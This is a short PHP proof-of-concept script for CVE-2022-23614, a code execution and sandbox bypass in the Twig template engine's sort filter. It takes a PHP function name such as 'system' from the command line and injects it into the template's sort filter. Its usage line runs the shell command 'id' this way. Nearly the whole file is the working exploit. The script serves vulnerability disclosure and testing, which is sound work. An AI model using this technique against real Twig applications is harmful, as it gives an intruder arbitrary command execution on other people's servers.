<?php
/*------------------------------------
This POC is used to demonstrate CVE-2022-23614 
(Twig sort filter code execution/sandbox bypass)

USAGE : php index.php 'system' '{"args": ["id", ""]}' 
                          ^                   ^
                  php sort function      array to sort
--------------------------------------*/

// Unquote only when using Composer
// require_once 'vendor/autoload.php';

// Unquote only when using php-twig debian package
require("Twig/autoload.php");

// First arg to CLI is Twig sort function to use in the template
$sortFunction = $argv[1];

// Second arg to CLI is the array to sort in the template
// This will be passed as data to the Twig template
$arrayToSort = json_decode($argv[2], true); 

// Create the template
$templateCode = "<h1>CVE-2022-23614</h1>\n";
$templateCode .= "<p>POC by Artamis</p>\n";
$templateCode .= "<div>\n";
$templateCode .= "{{ args|sort('" . $sortFunction . "') }}\n";
$templateCode .= "</div>\n";

// Creates Twig Loader
$loader = new Twig_Loader_Filesystem();

// Create Twig Environment with the `$loader` just made and some global settings
$twig = new Twig_Environment($loader, [
  'debug' => true,
]);

// Load the Twig template
$twig->getLoader()->prependPath(''); // Add an empty path to disable template caching
$modifiedTemplate = $twig->createTemplate($templateCode);

// Render the template
$renderedTemplate = $modifiedTemplate->render($arrayToSort);

echo $renderedTemplate;

?>